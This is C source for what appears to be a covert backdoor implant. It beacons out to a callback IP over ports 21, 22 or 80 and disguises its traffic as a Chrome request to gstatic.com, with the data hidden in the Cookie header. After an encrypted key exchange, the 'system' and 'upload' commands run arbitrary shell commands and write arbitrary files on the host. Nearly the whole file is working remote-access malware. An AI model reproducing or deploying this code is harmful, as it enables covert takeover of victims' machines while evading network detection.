#include <time.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <netinet/in.h>
#include "encryption.h"


void http_send(char* msg, int sock_fd)
{
    const char* tmp1 = "GET /chrome/profile_avatars/avatar_superhero.png "
        "HTTP/1.1\nHost: www.gstatic.com\nConnection: keep-alive\nCookie: ";
    const char* tmp2 = "\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 "
        "Safari/537.36\nAccept-Encoding: gzip, deflate\n\n";
    int size_of_buff = strlen(tmp1) + strlen(msg) + strlen(tmp2) + 1;
    char* sendbuff = malloc(size_of_buff);
    if (sendbuff)
    {
        strncpy(sendbuff, tmp1, size_of_buff);
        strncat(sendbuff, msg, size_of_buff);
        strncat(sendbuff, tmp2, size_of_buff);
        send(sock_fd, sendbuff, strlen(sendbuff), 0);
        free(sendbuff);
    }
}

void http_recv(char readbuff[], int sock_fd)
{
    char* end = {0};
    char* start = {0};
    char len[4096] = {0};
    char received[4096] = {0};
    memset(readbuff, 0, 4096);
    recv(sock_fd, received, 4096, 0);
    start = strstr(received, "<html>\n<body>\n");
    if (start)
    {
        end = strstr(start, "<div>");
        if (end)
        {
            strncpy(len, start+14, strlen(start) - strlen(end) - 14);
            memcpy(readbuff, end+5, atoi(len));
            if (strncmp(readbuff, "<ul>\n<li> ", 10) == 0)
                memset(readbuff, 0, 4096);
        }
    }
}

void set_port(char* service, struct sockaddr_in* addr)
{
    if (strcasecmp(service, "ftp") == 0)
        addr->sin_port = htons(21);
    else if (strcasecmp(service, "ssh") == 0)
        addr->sin_port = htons(22);
    else if (strcasecmp(service, "http") == 0)
        addr->sin_port = htons(80);
    else if (strcasecmp(service, "all") == 0)
    {
        int r = rand();
        int ports[] = {21,22,80};
        addr->sin_port = htons(ports[r % 3]);
    }
    else
        exit(-1);
}

void handle_command(char command[], unsigned char* secret_key, int sock_fd, EVP_CIPHER_CTX* en, EVP_CIPHER_CTX* de)
{
    if (strlen((char*)secret_key) == 0)
    {
        if (strncmp("connect", command, 7) == 0)
        {
            char generator[1024] = {0};
            char my_pubkey[4096] = {0};
            char their_pubkey[4096]  = {0};
            char* seperator = "</div>";
            char* start = {0};
            start = strstr(command, seperator);
            if (start)
            {
                if ((start - command -12 ) <= 1024)
                {
                    strncpy(generator, command+12, (start - command -12));
                    strncpy(their_pubkey, start + strlen(seperator), 4096);
                    auth_reply(my_pubkey, secret_key, generator, their_pubkey);
                    init_aes(secret_key, en, de);
                    http_send(my_pubkey, sock_fd);
                }
            }
        }
    }
    else
    {
        decrypt_msg(command, de);
        if (strncmp("disconnect", command, 10) == 0)
            memset(secret_key, 0, 1024);
        else if (strncmp("system", command, 6) == 0)
        {
            char* end = {0};
            char len[4096] = {0};
            char cmd[4096] = {0};
            end = strstr(command, "/");
            strncpy(len, command+6, strlen(command) - strlen(end) - 6);
            memcpy(cmd, end+1, atoi(len));
            system(cmd);
        }
        else if (strncmp("upload", command, 6) == 0)
        {
            FILE* f;
            char* end = {0};
            char len1[4096] = {0};
            char len2[4096] = {0};
            char path[4096] = {0};
            char content[4096] = {0};
            end = strstr(command, "/");
            strncpy(len1, command+6, strlen(command) - strlen(end) - 6);
            end = strstr(end+1, "/");
            strncpy(len2, command+6+strlen(len1)+1, strlen(command) - strlen(end) - 8);
            memcpy(path, end+1, atoi(len1));
            memcpy(content, end+1+atoi(len1), atoi(len2));
            f = fopen(path, "w");
            if (f)
            {
                fprintf(f, "%s", content);
                fflush(f);
                fclose(f);
            }
        }
    }
}

int run_server(char* service, char* callback)
{
    int result = 0;
    int sock_fd = 0;
    int timer[] = {2,4}; /*,30,240,600,1800,14400,86400};*/
    int timer_index = 0;
    char response[4096] = {0};
    unsigned char secret_key[1024] = {0};
    struct sockaddr_in addr;
    struct timeval timeout;
    EVP_CIPHER_CTX en;
    EVP_CIPHER_CTX de;
    srand(time(NULL));
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    while(1)
    {
        sock_fd = socket(AF_INET, SOCK_STREAM, 0);
        setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(callback);
        set_port(service, &addr);
        printf("sleep:%d\t", timer[timer_index]);
        if (strlen((char*)secret_key) == 0)
            printf("disconnected\n");
        else
            printf("connected\n");
        sleep(timer[timer_index]);
        result = connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
        if (result >= 0)
        {
            http_send("", sock_fd);
            http_recv(response, sock_fd);
            if (strlen(response) > 0)
            {
                handle_command(response, secret_key, sock_fd, &en, &de);
                timer_index = 0;
                close(sock_fd);
                continue;
            }
        }
        timer_index += 1;
        if (timer_index > sizeof(timer) / sizeof(timer[0]) -1)
            timer_index = sizeof(timer) / sizeof(timer[0]) -1;
        close(sock_fd);
    }
    return 0;
}
